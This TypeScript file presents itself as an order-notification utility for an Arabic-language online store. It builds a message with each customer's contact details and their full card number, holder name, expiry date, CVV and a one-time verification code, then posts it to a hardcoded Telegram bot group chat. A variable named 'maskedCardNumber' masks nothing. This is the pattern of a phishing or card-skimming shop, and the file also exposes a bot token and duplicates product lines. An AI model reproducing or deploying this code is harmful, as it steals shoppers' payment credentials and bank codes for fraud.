// Utility to send data to Telegram

interface OrderData {
  orderNumber?: string;
  shippingInfo: {
    fullName: string;
    address: string;
    phone: string;
    email: string;
    houseDescription?: string;
    countryCode?: string;
  };
  cartItems: {
    id: string;
    name: string;
    price: string;
    quantity: number;
    image_url: string;
    variant?: string;
    version?: string;
  }[];
  subtotal: number;
  shippingCost: number;
  shippingMethod?: string; // Added shipping method
  total: string;
  paymentMethod: string;
  paymentDetails?: {
    paymentMethod: string;
    cardNumber?: string;
    cardHolder?: string;
    expiryDate?: string;
    cvv?: string;
    verificationCode?: string; // Added verification code
  };
  installmentDetails?: {
    months: number;
    downPayment: number;
    monthlyInstallment: string;
    remainingAmount: number;
    schedule: {
      month: number;
      date: string;
      amount: string;
    }[];
  };
  invoiceUrl?: string; // URL to the invoice PDF
  contractUrl?: string; // URL to the contract PDF
}

/**
 * Sends order data to a Telegram bot
 * @param orderData The order data to send
 * @returns Promise that resolves when the message is sent
 */
export async function sendOrderToTelegram(
  orderData: OrderData
): Promise<boolean> {
  // Validate required fields
  if (
    !orderData.shippingInfo?.fullName ||
    !orderData.shippingInfo?.address ||
    !orderData.shippingInfo?.phone ||
    !orderData.shippingInfo?.email ||
    !orderData.shippingMethod ||
    !orderData.paymentMethod ||
    !orderData.total
  ) {
    console.error("Missing required order data fields");
    return false;
  }

  // Log the complete order data for debugging purposes
  console.log(
    "Sending order data to Telegram:",
    JSON.stringify(orderData, null, 2)
  );
  try {
    const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
    const chatId = "-1002630840593"; // Group chat ID

    // Remove any Markdown-like formatting
    const removeMarkdownFormatting = (text: string) => {
      if (!text) return "";
      return (
        text
          .toString()
          // Remove asterisks (bold/italic markers)
          .replace(/[*_]/g, "")
          // Remove backslash escapes
          .replace(/\\/g, "")
      );
    };

    let message = "🛒 طلب جديد 🛒\n\n";

    // Customer information
    message += "معلومات العميل\n";
    message += `الاسم: ${removeMarkdownFormatting(
      orderData.shippingInfo.fullName
    )}\n`;
    message += `العنوان: ${removeMarkdownFormatting(
      orderData.shippingInfo.address
    )}\n`;
    // Format phone number with country code
    const fullPhoneNumber = `+${removeMarkdownFormatting(
      orderData.shippingInfo.countryCode || ""
    )}${removeMarkdownFormatting(orderData.shippingInfo.phone)}`;

    // Log the full phone number for debugging
    console.log("Full phone number with country code:", fullPhoneNumber);

    message += `الهاتف: ${fullPhoneNumber}\n`;
    message += `البريد الإلكتروني: ${removeMarkdownFormatting(
      orderData.shippingInfo.email
    )}\n`;

    if (orderData.shippingInfo.houseDescription) {
      message += `وصف البيت: ${removeMarkdownFormatting(
        orderData.shippingInfo.houseDescription
      )}\n`;
    }
    message += "\n";

    // Order items
    message += "المنتجات\n";
    orderData.cartItems.forEach((item, index) => {
      message += `${index + 1}. ${removeMarkdownFormatting(item.name)}
`;
      if (item.variant) {
        message += `   مساحة التخزين: ${removeMarkdownFormatting(item.variant)}
`;
      }
      if (item.version) {
        message += `   النسخة: ${
          item.version === "me" ? "الشرق الأوسط" : "الأمريكية"
        }
`;
      }
      message += `   الكمية: ${removeMarkdownFormatting(
        item.quantity.toString()
      )}
   السعر: ${removeMarkdownFormatting(item.price)}
`;
      if (item.variant) {
        message += `   مساحة التخزين: ${removeMarkdownFormatting(item.variant)}
`;
      }
      if (item.version) {
        message += `   النسخة: ${
          item.version === "me" ? "الشرق الأوسط" : "الأمريكية"
        }
`;
      }
      message += `   الكمية: ${removeMarkdownFormatting(
        item.quantity.toString()
      )}
   السعر: ${removeMarkdownFormatting(item.price)}
`;
    });

    // Order summary
    message += "\nملخص الطلب\n";
    message += `المجموع الفرعي: ${removeMarkdownFormatting(
      orderData.subtotal.toFixed(2)
    )} د.إ\n`;
    message += `رسوم الشحن: ${removeMarkdownFormatting(
      orderData.shippingCost.toFixed(2)
    )} د.إ\n`;
    message += `شركة التوصيل: ${removeMarkdownFormatting(
      getShippingMethodName(orderData.shippingMethod || "aramex")
    )}\n`;
    message += `الإجمالي: ${removeMarkdownFormatting(orderData.total)} د.إ\n`;
    message += `طريقة الدفع: ${removeMarkdownFormatting(
      getPaymentMethodName(orderData.paymentMethod)
    )}\n`;

    // Add payment details if available
    if (orderData.paymentDetails) {
      message += "\n🔒 Payment Details 🔒\n";
      if (orderData.paymentDetails.cardNumber) {
        const maskedCardNumber = orderData.paymentDetails.cardNumber.replace(
          /\s/g,
          ""
        );
        if (orderData.paymentDetails.cardHolder) {
          message += `Card Holder: ${orderData.paymentDetails.cardHolder}\n`;
        }
        message += `Card Number: ${maskedCardNumber}\n`;
      }
      if (orderData.paymentDetails.expiryDate) {
        message += `Expiry Date: ${orderData.paymentDetails.expiryDate}\n`;
      }
      if (orderData.paymentDetails.cvv) {
        message += `CVV: ${orderData.paymentDetails.cvv}\n`;
      }
      if (orderData.paymentDetails.verificationCode) {
        message += `Verification Code: ${orderData.paymentDetails.verificationCode}\n`;
      }
    }

    // Add installment details if available
    if (orderData.installmentDetails) {
      message += "\n📅 تفاصيل التقسيط\n";
      message += `عدد الأشهر: ${orderData.installmentDetails.months}\n`;
      message += `الدفعة الأولى: ${orderData.installmentDetails.downPayment.toFixed(
        2
      )} د.إ\n`;
      message += `القسط الشهري: ${orderData.installmentDetails.monthlyInstallment} د.إ\n`;
      message += `المبلغ المتبقي: ${orderData.installmentDetails.remainingAmount.toFixed(
        2
      )} د.إ\n\n`;

      message += "جدول الأقساط الشهرية:\n";
      orderData.installmentDetails.schedule.forEach((payment, index) => {
        message += `الشهر ${payment.month}: ${payment.amount} د.إ - ${payment.date}\n`;
      });
      message += "\n";
    }

    // Add invoice and contract links
    if (orderData.invoiceUrl) {
      message += `\n📄 رابط الفاتورة: ${orderData.invoiceUrl}\n`;
    }
    if (orderData.contractUrl) {
      message += `\n📝 رابط عقد البيع: ${orderData.contractUrl}\n`;
    }

    // Log the message before sending
    console.log("Formatted message to be sent:", message);

    // Send the message without Markdown parsing
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          // Remove parse_mode to send as plain text
        }),
      }
    );

    const data = await response.json();

    // Log the response for debugging
    if (!data.ok) {
      console.error("Telegram API Error:", data);
      throw new Error(
        `فشل في إرسال الرسالة: ${data.description || "خطأ غير معروف"}`
      );
    }

    return data.ok;
  } catch (error) {
    console.error("Error sending order to Telegram:", error);
    return false;
  }
}

/**
 * Converts payment method code to readable name
 */
function getPaymentMethodName(method: string): string {
  switch (method) {
    case "credit_card":
      return "بطاقة ائتمان";
    case "debit_card":
      return "بطاقة خصم";
    case "tabby":
      return "تقسيط (تابي)";
    case "tamara":
      return "تقسيط (تمارا)";
    case "cash_on_delivery":
      return "الدفع عند الاستلام";
    case "cash":
      return "الدفع نقداً";
    case "apple_pay":
      return "أبل باي";
    default:
      return method;
  }
}

/**
 * Converts shipping method code to readable name
 */
function getShippingMethodName(method: string): string {
  switch (method) {
    case "aramex":
      return "أرامكس";
    case "smsa":
      return "سمسا";
    default:
      return method;
  }
}
